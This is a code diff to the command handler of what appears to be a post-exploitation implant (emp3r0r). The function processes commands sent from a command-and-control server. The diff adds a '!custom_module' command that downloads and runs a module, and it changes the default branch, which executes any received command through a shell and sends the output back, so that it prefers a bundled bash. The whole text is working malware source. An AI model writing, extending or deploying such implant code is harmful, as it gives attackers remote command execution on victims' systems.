@@ -421,6 +421,15 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		out = vaccineHandler()
 		sendResponse(out)
 
+		// download a module and run it
+	case "!custom_module":
+		if len(cmdSlice) != 2 {
+			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
+			return
+		}
+		out = moduleHandler(cmdSlice[1])
+		sendResponse(out)
+
 		// persistence
 	case "!persistence":
 		if len(cmdSlice) != 2 {
@@ -492,7 +501,11 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 	default:
 		// exec cmd using os/exec normally, sends stdout and stderr back to CC
-		cmd := exec.Command("/bin/sh", "-c", strings.Join(cmdSlice, " "))
+		shell := "/bin/sh"
+		if util.IsFileExist(emp3r0r_data.UtilsPath + "bash") {
+			shell = emp3r0r_data.UtilsPath + "bash"
+		}
+		cmd := exec.Command(shell, "-c", strings.Join(cmdSlice, " "))
 		outCombined, err = cmd.CombinedOutput()
 		if err != nil {
 			log.Println(err)
